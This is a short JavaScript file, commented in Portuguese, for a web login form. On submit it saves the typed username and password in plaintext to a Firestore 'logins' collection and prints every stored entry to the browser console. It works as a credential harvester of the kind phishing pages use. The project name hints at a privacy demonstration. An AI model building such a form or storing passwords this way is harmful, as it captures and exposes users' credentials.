import { collection, addDoc, onSnapshot, getFirestore } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";

// Suas configurações do Firebase
const firebaseConfig = {
  apiKey: "AIzaSyCJxMCIXMcpTgId8Uu5KN5t3gw6Z6Qt1ss",
  authDomain: "privacidade-dados.firebaseapp.com",
  projectId: "privacidade-dados",
  storageBucket: "privacidade-dados.appspot.com",
  messagingSenderId: "1049783164853",
  appId: "1:1049783164853:web:2b01b66e308260e5d703fc"
};

// Inicialize o Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app); // Conecta ao Firestore

document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    try {
        // Tenta adicionar os dados ao Firestore
        const docRef = await addDoc(collection(db, "logins"), {
            username: username,
            password: password
        });
        console.log("Documento escrito com ID: ", docRef.id);
    } catch (error) {
        // Se houver algum erro, exibe no console
        console.error("Erro ao adicionar documento: ", error);
    }

    this.reset(); // Limpa o formulário após submissão
});

// Escuta novos logins em tempo real e mostra no console
onSnapshot(collection(db, "logins"), (querySnapshot) => {
    querySnapshot.forEach((doc) => {
        console.log(`${doc.id} => ${JSON.stringify(doc.data())}`);
    });
});
